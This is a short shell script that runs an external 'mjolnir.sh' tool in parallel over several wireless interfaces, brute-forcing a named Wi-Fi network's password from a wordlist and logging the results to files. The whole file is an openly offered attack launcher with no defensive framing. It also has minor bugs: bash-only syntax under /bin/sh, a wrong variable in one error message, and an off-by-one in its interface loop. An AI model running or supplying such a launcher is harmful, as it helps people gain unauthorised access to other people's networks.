#!/bin/sh

usage () {
   echo "Usage: "
   echo "   $0 ESSID Wordlist wifiInterface1 WifiInterface2 ..."
   echo "   You can use any wifiInterface as you want"
}

#Check for args and -h/--help
if [ $# -eq 0 ] || [ $1 == "-h" -o $1 == "--help" ]; then
   usage
   exit
fi

#Check if wordlist exists
if [ ! -f $2 ]; then
    echo "File $1 not found!"
    usage
    exit
fi

#Check if mjolnir.sh exists
if [ ! -f "mjolnir.sh" ]; then
    echo "mjolnir.sh script not found!"
    usage
    exit
fi

#Check if network interfaces exist
args=("$@")
for i in $(seq 2 $(expr $# - 1)); do
  if ! grep -q ${args[$i]} /proc/net/dev; then  
     echo "${args[$i]} interface not found"
     exit 
  fi
done

#Run the attack
for i in $(seq 2 $(expr $# - 1)); do
  ./mjolnir.sh $1 $2 ${args[$i]} > mjolnir-result-${args[$i]}.txt &	
done

echo "Attack is running, check processes using: watch 'ps -ef |grep \"mjolnir\"'"
